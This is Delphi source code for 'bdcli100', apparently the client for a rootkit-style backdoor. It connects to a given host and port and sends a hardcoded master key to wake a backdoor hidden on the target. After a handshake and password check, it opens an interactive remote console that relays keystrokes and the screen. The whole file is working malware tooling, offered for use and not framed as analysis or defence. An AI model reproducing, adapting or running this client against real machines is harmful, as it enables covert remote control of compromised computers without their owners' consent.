program bdcli100;
{$APPTYPE CONSOLE}
uses Windows,USysUtils,UTCP,UJQCompress;
const
 MASTER_KEY_LEN=32;
 MasterKey=#$01#$9A#$8C#$66#$AF#$C0#$4A#$11
          +#$9E#$3F#$40#$88#$12#$2C#$3A#$4A
          +#$84#$65#$38#$B0#$B4#$08#$0B#$AF
          +#$DB#$CE#$02#$94#$34#$5F#$22#$00;

 BSC_INIT_REQ_1             =$E0;
 BSC_INIT_RES_1             =$E1;
 BSC_INIT_REQ_2             =$E2;
 BSC_INIT_RES_2             =$E3;
 BSC_INIT_REQ_3             =$E4;
 BSC_INIT_RES_3             =$E5;
 BSC_INIT_COMPLETE          =$E6;
 BSC_CONSOLE_INPUT          =$E7;
 BSC_CONSOLE_OUTPUT         =$E8;
 BSC_AUTHORIZATION_OK       =$E9;
 BSC_AUTHORIZATION_FAILED   =$EA;
 BSC_SERVICE_BACKDOOR       =$EB;
 BSC_SERVICE_REDIRECTOR     =$EC;
 BSC_SERVICE_TEST_REQ       =$ED;
 BSC_SERVICE_TEST_RES       =$EE;
 BSC_CTRL_EVENT             =$EF;
 BSC_END_REQ                =$F0;

type
 TCharInfoEx=record
  case Byte of
   0:(UnicodeChar:WCHAR;
      UAttributes:Word);
   1:(AsciiChar:CHAR;
      AAttributes:Word);
 end;

 TConsoleScreen=array[0..24,0..79] of TCharInfoEx;
 TConsoleScreenSmall=record
  Chars:array[0..25*80-1] of Char;
  Attrs:array[0..25*80-1] of Byte;
 end;

 TOutputBuffer=record
  ConsoleBuffer:TConsoleScreenSmall;
  CursorPosition:TCoord;
 end;
 TInputBuffer=array[0..127] of TInputRecord;
 PBackdoorBuffer=^TBackdoorBuffer;
 TBackdoorBuffer=packed record
  ID:Byte;
  Size:Word;
  case Byte of
   0:(InputBuffer:TInputBuffer);
   1:(OutputBuffer:TOutputBuffer);
   2:(CtrlType:Cardinal);
   3:(Raw:array[0..4000-1] of Char);
 end;

var
 Client:TTCPClient;
 Buf:array[1..8192] of Char;
 Host,PortStr,PassStr:string;
 AuthPass:array[0..15] of Char;
 Port:Word;
 Sign:Byte;
 ReadInputTID,WriteOutputTID,AuthNum:Cardinal;
 I:Integer;
 DoRead:Boolean;
 InputHandle,OutputHandle,ReadInputThreadHandle,WriteOutputThreadHandle:THandle;
 HandleArray:array[0..1] of THandle;
 FirstCoords,SecondCoords:TCoord;
 FirstRect:TSmallRect;
 FullConsoleScreen:TConsoleScreen;

procedure Usage;
begin
 WriteLn('usage: ',ParamStr(0),' host port password');
 Halt;
end;

function AuthStrToNum(P:Pointer):Cardinal; stdcall; assembler;
asm
 @auth:
  push edi
  push ebx
  push esi
  mov esi,P
  push esi
  push 03F1h
  pop ebx
  mov eax,0FA230000h
  mov edx,0633AF89Eh
  mov edi,03481A3C1h
 @auth_first:
  pop esi
  push esi
  push 008h
  pop ecx
 @auth_next:
  lodsw
  shl eax,003h
  add eax,edi
  xor edx,eax
  add dh,cl
  setz al
  inc al
  add edi,eax
  loop @auth_next
 @auth_end:
  add edx,edi
  dec ebx
  jnz @auth_first
  mov eax,edx
  pop esi
  pop esi
  pop ebx
  pop edi
end;

procedure ReadInputProc(AArgs:Pointer); stdcall;
var
 LBDBuffer:TBackdoorBuffer;
 LInBuffer:TInputBuffer;
 LEventsRead:Cardinal;
 LI,LJ:Integer;
begin
 LBDBuffer.ID:=BSC_CONSOLE_INPUT;
 with Client do
 while GetNumberOfConsoleInputEvents(InputHandle,LEventsRead)
   and DoRead do
 begin
  if LEventsRead>0 then
  begin
   ZeroMemory(@Buf,SizeOf(Buf));

   if ReadConsoleInput(InputHandle,LInBuffer[0],256,LEventsRead) then
   begin
    LJ:=0;
    ZeroMemory(@LBDBuffer.InputBuffer,SizeOf(LBDBuffer.InputBuffer));
    for LI:=0 to LEventsRead-1 do
    with LInBuffer[LI] do
    if (EventType=KEY_EVENT) or (EventType=_MOUSE_EVENT) then
    begin
     LBDBuffer.InputBuffer[LJ]:=LInBuffer[LI];
     Inc(LJ);
    end;

    if LJ>0 then
    begin
     LBDBuffer.Size:=LJ*SizeOf(TInputRecord);
     SendData(@LBDBuffer,LBDBuffer.Size+3);
    end;
   end;
  end else WaitPoint;
 end;
 ExitThread(0);
end;

procedure WriteOutputProc(AArgs:Pointer); stdcall;
var
 LPBDBuffer:PBackdoorBuffer;
 LBDBuffer:TBackdoorBuffer;
 LFullConsoleScreen,LTmpScreen:TConsoleScreen;
 LI,LJ,LRet:Integer;
 LLargeBuffer:array[0..65535] of Char;
 LOverflow:Boolean;
 LRawBuf:array[0..4000-1] of Char;
 LPB:PByte;
begin
 ZeroMemory(@LFullConsoleScreen,SizeOf(LFullConsoleScreen));
 ZeroMemory(@LTmpScreen,SizeOf(LTmpScreen));
 LOverflow:=False;
 LRet:=0;
 with Client do
 while DoRead do
 begin
  LPB:=@LLargeBuffer;
  if not LOverflow then
  begin
   ZeroMemory(@LLargeBuffer,SizeOf(LLargeBuffer));
   LRet:=RecvData(@LLargeBuffer,SizeOf(LLargeBuffer));
  end else
  begin
   Inc(LPB,LRet);
   LRet:=LRet+RecvData(LPB,SizeOf(LLargeBuffer)-LRet);
  end;

  if LRet>0 then
  begin
   LOverflow:=False;
   LPB:=@LLargeBuffer;
   while LRet>0 do
   begin
    LPBDBuffer:=PBackdoorBuffer(LPB);
    LBDBuffer:=LPBDBuffer^;
    if LRet<LBDBuffer.Size+3 then
    begin
     LOverflow:=True;
     CopyMemory(@LLargeBuffer,LPB,LRet);
     Break;
    end;
    Dec(LRet,LBDBuffer.Size+3);
    Inc(LPB,LBDBuffer.Size+3);

    case LBDBuffer.ID of
     BSC_CONSOLE_OUTPUT:begin
      CopyMemory(@LRawBuf,@LBDBuffer.Raw,LBDBuffer.Size);
      JQDecompress(@LBDBuffer.OutputBuffer,@LRawBuf,LBDBuffer.Size);

      for LJ:=0 to 79 do
       for LI:=0 to 24 do
       begin
        LFullConsoleScreen[LI,LJ].AsciiChar:=Chr(Ord(LBDBuffer.OutputBuffer.ConsoleBuffer.Chars[LJ*25+LI]) xor Ord(LTmpScreen[LI,LJ].AsciiChar));
        LFullConsoleScreen[LI,LJ].AAttributes:=LBDBuffer.OutputBuffer.ConsoleBuffer.Attrs[LJ*25+LI] xor LTmpScreen[LI,LJ].AAttributes;
       end;
      LTmpScreen:=LFullConsoleScreen;

      WriteConsoleOutput(OutputHandle,@LFullConsoleScreen,FirstCoords,SecondCoords,FirstRect);
      SetConsoleCursorPosition(OutputHandle,LBDBuffer.OutputBuffer.CursorPosition);
     end;
     BSC_END_REQ:DoRead:=False;
    end;
   end;
  end;
  WaitPoint;
 end;
 ExitThread(0);
end;

function HandlerRoutine(ACtrlType:Cardinal):Boolean; stdcall;
var
 LBDBuffer:TBackdoorBuffer;
begin
 Result:=True;
 if Client=nil then Exit;
 with Client do
 begin
  LBDBuffer.ID:=BSC_CTRL_EVENT;    
  LBDBuffer.Size:=4;
  LBDBuffer.CtrlType:=ACtrlType;
  SendData(@LBDBuffer,LBDBuffer.Size+3);
 end;
end;

begin
 Port:=0;
 case ParamCount of
  0:begin
   Write('Host: ');
   ReadLn(Host);
   Write('Port: ');
   ReadLn(PortStr);
   Write('Pass: ');
   ReadLn(PassStr);
   Port:=StrToIntDef(PortStr);
  end;
  3:begin
   Host:=ParamStr(1);
   Port:=StrToIntDef(ParamStr(2));
   PassStr:=ParamStr(3);
  end;
  else Usage;
 end;
 PassStr:=Copy(PassStr,1,16);
 FillChar(AuthPass,SizeOf(AuthPass),$20);
 CopyMemory(@AuthPass,Pointer(PassStr),Length(PassStr));
 AuthNum:=AuthStrToNum(@AuthPass);

 if Port=0 then Usage;
 try
  Client:=TTCPClient.Create;
  Client.SetHost(Host,Port);
  WriteLn('connecting server ...');
  with Client do
  if Connect then
  begin
   WriteLn('receiving banner ...');
   Sleep(100);
   while RecvData(@Buf,SizeOf(Buf),500)>0 do WaitPoint(100);
   Write('opening backdoor .');
   for I:=1 to 20 do
   begin
    Write('.');
    ZeroMemory(@Buf,SizeOf(Buf));
    CopyMemory(@Buf,@MasterKey[1],MASTER_KEY_LEN);
    SendData(@Buf,MASTER_KEY_LEN);
    if I mod 3=0 then SendData(@Buf,MASTER_KEY_LEN);
    if I mod 4=0 then SendData(@Buf,MASTER_KEY_LEN);
    if I mod 5=0 then SendData(@Buf,MASTER_KEY_LEN);
    if I mod 6=0 then SendData(@Buf,MASTER_KEY_LEN);
    Sign:=0;
    RecvData(@Sign,SizeOf(Sign),2000);
    Sleep(10);
    if Sign=BSC_INIT_REQ_1 then Break;
   end;
   WriteLn;
   if Sign=BSC_INIT_REQ_1 then
   begin
    WriteLn('backdoor found');
    while RecvData(@Buf,SizeOf(Buf),250)>0 do WaitPoint(100);

    ZeroMemory(@Buf,SizeOf(Buf));
    Write('checking backdoor .');

    for I:=1 to 20 do
    begin
     Write('.');

     case Sign of
      0:Sign:=BSC_INIT_RES_1;
      BSC_INIT_REQ_1,BSC_INIT_REQ_2,BSC_INIT_REQ_3:Inc(Sign);
      BSC_INIT_COMPLETE:Break;
     end;
     SendData{Buffer}(@Sign,SizeOf(Sign));
     Sign:=0;
     RecvData(@Sign,SizeOf(Sign),5000);
    end;
    WriteLn;
    if Sign=BSC_INIT_COMPLETE then
    begin
     WriteLn('backdoor ready');
     SendData(@AuthNum,SizeOf(AuthNum));
     WriteLn('authorization sent, waiting for reply');
     Write('authorization - ');
     RecvData(@Sign,SizeOf(Sign));
     if Sign=BSC_AUTHORIZATION_OK then
     begin
      WriteLn('SUCCESSFUL');
      Sign:=BSC_SERVICE_BACKDOOR;
      SendData(@Sign,SizeOf(Sign));

      WriteLn('backdoor activated!');
      WriteLn('close shell and all progz to end session');
      WaitPoint(800);

      InputHandle:=GetStdHandle(STD_INPUT_HANDLE);
      OutputHandle:=GetStdHandle(STD_OUTPUT_HANDLE);
      FirstCoords.X:=80;
      FirstCoords.Y:=25;
      SetConsoleScreenBufferSize(OutputHandle,FirstCoords);

      with FirstRect do
      begin
       Left:=0;
       Top:=0;
       Right:=79;
       Bottom:=24;
      end;
      SetConsoleWindowInfo(OutputHandle,True,FirstRect);
      SetConsoleCtrlHandler(@ExitProcess,False);
      SetConsoleCtrlHandler(@HandlerRoutine,True);
      SetConsoleCtrlHandler(nil,False);


      ZeroMemory(@FullConsoleScreen,SizeOf(FullConsoleScreen));
      SecondCoords.X:=0;
      SecondCoords.Y:=0;
      WriteConsoleOutput(OutputHandle,@FullConsoleScreen,FirstCoords,SecondCoords,FirstRect);
      SetConsoleCursorPosition(OutputHandle,SecondCoords);

      DoRead:=True;
      ReadInputThreadHandle:=CreateThread(nil,0,@ReadInputProc,nil,0,ReadInputTID);
      WriteOutputThreadHandle:=CreateThread(nil,0,@WriteOutputProc,nil,0,WriteOutputTID);
      HandleArray[0]:=ReadInputThreadHandle;
      HandleArray[1]:=WriteOutputThreadHandle;
      WaitForMultipleObjects(2,@HandleArray,False,$FFFFFFFF);
      DoRead:=False;
      Sign:=BSC_END_REQ;
      SendData(@Sign,SizeOf(Sign));
      WaitPoint(300);
      TerminateThread(ReadInputTID,0);
      TerminateThread(WriteOutputTID,0);
     end else
     begin
      WriteLn('FAILED');
      if Sign=BSC_AUTHORIZATION_FAILED then WriteLn('Bad password!')
      else WriteLn('backdoor is corrupted');
     end;
    end else
    begin
     Sign:=BSC_END_REQ;
     for I:=1 to 4 do
      SendData(@Sign,SizeOf(Sign));
     WriteLn('backdoor is corrupted on ',Host,':',Port,' - try it again later');
    end;
   end else WriteLn('backdoor is not installed on ',Host,':',Port);
  end else WriteLn('unable to connect to ',Host,':',Port);
  Client.Free;
 except
  WriteLn('error occurred, try to restart program');
 end;
end.
